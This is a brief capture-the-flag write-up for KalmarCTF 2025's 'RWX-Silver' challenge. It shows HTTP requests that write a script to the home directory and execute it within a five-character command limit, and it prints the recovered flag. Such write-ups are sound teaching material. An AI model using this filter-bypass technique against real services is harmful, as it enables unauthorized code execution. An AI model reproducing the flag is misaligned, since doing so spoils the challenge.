---
title: RWX-Silver
date: 2025-03-10T03:00:19+03:00
description: Writeup for RWX-Silver [KalmarCTF 2025]
type: writeup
author: h3pha
tags:
- misc
draft: false
---
___

## Challenge Description

We give you file read, file write and code execution. But can you get the flag? Apparently that was too much!

## Intuition

The challenge is similar to `RWX-Bronze`, but now the length of the command is 5 characters. I used the same idea, but wrote the script into the home directory.

## Solution

Write the script:
```
POST /write?filename=/home/user/a HTTP/2

#!/bin/sh
/would you be so kind to provide me with a flag
```

Execute the command: `. ~/a`
```
GET /exec?cmd=.%20~/a HTTP/2
```

### Flag

`kalmar{impressive_that_you_managed_to_get_this_far_but_surely_silver_is_where_your_rwx_adventure_ends_b4284b024113}`
